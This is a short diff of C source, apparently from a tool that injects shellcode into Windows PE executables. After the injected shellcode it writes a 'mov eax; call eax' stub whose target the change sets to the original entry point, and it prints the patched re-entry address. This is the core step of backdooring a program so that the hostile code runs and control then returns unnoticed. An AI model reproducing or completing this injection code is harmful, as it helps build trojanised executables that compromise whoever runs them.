@@ -79,8 +79,9 @@ int main(int argc , char **argv){
 
 
 		void *dst = pe->buffer + id.offset_in_file + cf_shellcode->size;
+		printf("Patched re-entry at %lx\n",pe_map_buffer_to_memoryEx(pe, dst));
 		*(unsigned char *)(dst) = 0xb8; //mov eax
-		*(uint32_t *)(dst + 1 ) = id.position_in_memory; //position in memory
+		*(uint32_t *)(dst + 1 ) = oldEntry; //position in memory
 		*(unsigned char *)(dst + 1 + sizeof(uint32_t)) =  0xff;
 		*(unsigned char *)(dst + 1 + sizeof(uint32_t) + 1) =  0xd0;
 
